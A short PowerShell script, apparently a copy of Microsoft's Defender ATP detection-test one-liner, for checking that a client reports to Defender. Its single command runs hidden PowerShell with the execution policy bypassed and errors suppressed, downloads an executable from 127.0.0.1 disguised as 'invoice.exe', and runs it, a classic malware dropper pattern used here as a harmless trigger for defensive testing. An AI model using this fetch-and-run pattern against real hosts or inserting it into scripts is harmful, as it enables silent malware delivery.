<#
.SYNOPSIS
Script to onboard or test/update connectivity from a client to Defender ATP.

.AUTHOR 
Thomas Balder (inspired by others)
https://github.com/ThomasBalder/PublicScripts 
Microsoft > you can find this oneliner in the Defender ATP settings.

.DESCRIPTION 

.REQUIREMENTS
- At least Powershell V5


.INSTRUCTIONS
- Run script in an elevated (administrator) Powershell prompt on the client;
#>

powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe'); Start-Process 'C:\\test-WDATP-test\\invoice.exe'